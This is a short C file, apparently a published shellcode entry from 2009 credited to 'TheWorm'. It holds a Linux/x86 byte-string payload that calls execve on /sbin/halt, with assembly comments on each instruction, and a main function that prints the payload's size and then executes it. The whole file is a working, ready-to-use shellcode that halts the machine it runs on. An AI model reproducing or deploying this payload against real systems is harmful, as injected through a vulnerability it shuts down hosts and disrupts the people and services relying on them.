#include <stdio.h>

const char shellcode[]=
	"\x6a\x0b"		// push	$0xb
	"\x58"			// pop	%eax
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x66\x68\x6c\x74"	// pushw $0x746c
	"\x68\x6e\x2f\x68\x61"	// push	$0x61682f6e
	"\x68\x2f\x73\x62\x69"	// push	$0x6962732f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/halt,/sbin/halt)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}